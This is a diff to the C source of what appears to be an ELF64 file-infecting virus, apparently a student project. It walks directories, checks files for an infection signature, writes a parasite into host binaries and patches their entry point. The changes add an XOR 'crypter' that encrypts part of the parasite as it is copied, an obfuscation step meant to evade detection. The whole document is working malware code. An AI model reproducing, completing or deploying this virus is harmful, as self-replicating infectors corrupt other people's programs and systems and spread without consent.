@@ -162,7 +162,7 @@ __syscall2(int, rename, const char *, old, const char *, new);
 __syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
 __syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
 __syscall3(int, getdents64, unsigned int, fd, struct linux_dirent64*, dirp,  unsigned int, count);
-__syscall3(off_t, lseek, int, fd, off_t, offset,  int, whence);// a surpprimer
+// __syscall3(off_t, lseek, int, fd, off_t, offset,  int, whence);// a surpprimer
 __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count); // poura etre decalle apres (used for debug)
 
 bool process_runing(void)
@@ -550,6 +550,8 @@ int main_encrypt()
 }
 __syscall1(int, unlink, const char *, pathname);
 __syscall2(int, fstat, int, fildes, struct stat * , buf);
+__syscall3(off_t, lseek, int, fildes, off_t, offset, int, whence);
+size_t crypter(char *read, size_t size, char key, int fd);
 
 
 int get_env_var(char *name, char *content, int content_size)
@@ -620,6 +622,7 @@ int get_env_var(char *name, char *content, int content_size)
 	close(fd);
 	return (content[0] != '\0');
 }
+
 int open_directory(char *path)
 {
 	int dd,nread;
@@ -763,6 +766,7 @@ int open_directory(char *path)
 	close(dd);
 	return 0;
 }
+
 int do_the_job(char buff[],size_t size, char *path)
 {
  	char debut[18];
@@ -918,6 +922,7 @@ int do_the_job(char buff[],size_t size, char *path)
 	ft_putstr(fin);
 	return 0;
 }
+
 int infect(char path[],size_t path_length)
 {
 	size_t i = 0;
@@ -947,6 +952,7 @@ int infect(char path[],size_t path_length)
 	while(i < path_length);
 	return 0;
 }
+
 char    *only_name(char *line)
 {
 	int        size;
@@ -959,6 +965,7 @@ char    *only_name(char *line)
 	}
 	return (line);
 }
+
 void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry)
 {
 	int fd;
@@ -1029,6 +1036,7 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 
 
 	unsigned long address_of_start = get_eip() - ((char *)&yeah - (char *)&real_start);
+	unsigned long address_of_start_encrypt = get_eip() - ((char *)&yeah - (char *)&main_encrypt);
 
 	size_t size_wrote = 0;
 	size_wrote =	put_sig(fd);
@@ -1050,8 +1058,9 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	fwe[13] =0;
 	ft_putstr(fwe);ft_putnbr(size_wrote);ft_putchar('\n');
 
-	size_wrote += write(fd,"\xcc",1);
-	size_wrote += write(fd,(char *) address_of_start,parasite_size - 7);
+	// size_wrote += write(fd,"\xcc",1);
+	size_wrote += write(fd,(char *) address_of_start, address_of_start_encrypt - address_of_start);//parasite_size - 7);
+	size_wrote += crypter(address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , 56, fd);
 	size_wrote += write(fd,jmp_code,7);
 
 	for (int i = 0; i< PAGE_SIZE - size_wrote ;i++)
@@ -1161,7 +1170,7 @@ int             ft_strncmp(const char *s1, const char *s2, size_t n)
 	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
 }
 
- bool	is_infected(char *data)
+bool	is_infected(char *data)
 {
 	Elf64_Ehdr          *header;
 	char sig[54];
@@ -1284,9 +1293,7 @@ int             ft_strncmp(const char *s1, const char *s2, size_t n)
 	return(1);
 }
 
-
-
- size_t	put_sig(int fd)
+size_t	put_sig(int fd)
 {
 	char sig[54];
 	sig[0] ='F';
@@ -1358,20 +1365,20 @@ int             ft_strncmp(const char *s1, const char *s2, size_t n)
 	unsigned long address_of_main = get_eip() - ((char *)&yeah - (char *)&real_start);
 
 	if (im_infected(address_of_main))
-{
-		char name_new[9];
-	name_new[0]='n';
-	name_new[1]='e';
-	name_new[2]='w';
-	name_new[3]=' ';
-	name_new[4]='o';
-	name_new[5]='n';
-	name_new[6]='e';
-	name_new[7]='\n';
-	name_new[8]=0;
-	ft_putstr(name_new);
-	*(long long *)fingerprint = address_of_main - sizeof(long long);
-}
+	{
+			char name_new[9];
+		name_new[0]='n';
+		name_new[1]='e';
+		name_new[2]='w';
+		name_new[3]=' ';
+		name_new[4]='o';
+		name_new[5]='n';
+		name_new[6]='e';
+		name_new[7]='\n';
+		name_new[8]=0;
+		ft_putstr(name_new);
+		*(long long *)fingerprint = address_of_main - sizeof(long long);
+	}
 	ft_putstr(fingerprint);
 
 	i = 7;
@@ -1394,7 +1401,7 @@ int             ft_strncmp(const char *s1, const char *s2, size_t n)
 	return (size);
 }
 
-void crypter(char *read, size_t size, char key, int fd)
+size_t crypter(char *read, size_t size, char key, int fd)
 {
 	char tab[2];
 	tab[0]=0;
@@ -1402,6 +1409,7 @@ void crypter(char *read, size_t size, char key, int fd)
 
 	if(size)
 	{
+		i = 0;
 		lseek(fd, (off_t)size, SEEK_CUR);
 		// ft_putnbr(lseek(fd, (off_t)size, SEEK_CUR));
 		// ft_putstr("\n");
@@ -1413,17 +1421,18 @@ void crypter(char *read, size_t size, char key, int fd)
 		// 	ft_putnbr(size);
 		// ft_putstr("\\");
 			tab[size % 2] = (read[size] ^ tab[(size - 1) % 2]);
-			write(fd, &(tab[size % 2]), 1);
+			i += write(fd, &(tab[size % 2]), 1);
 			lseek(fd, (off_t)-2, SEEK_CUR);
 			size--;
 		}
 		tab[size % 2] = (read[size] ^ key);
-		write(fd, &(tab[size % 2]), 1);
+		i += write(fd, &(tab[size % 2]), 1);
 		// ft_putstr("bite\n");
 		lseek(fd, (off_t)0, SEEK_END);
 		ft_putnbr(lseek(fd, (off_t)0, SEEK_END));
 		// ft_putstr("\n");
 		size--;
+		return (i);
 	}
 }
 
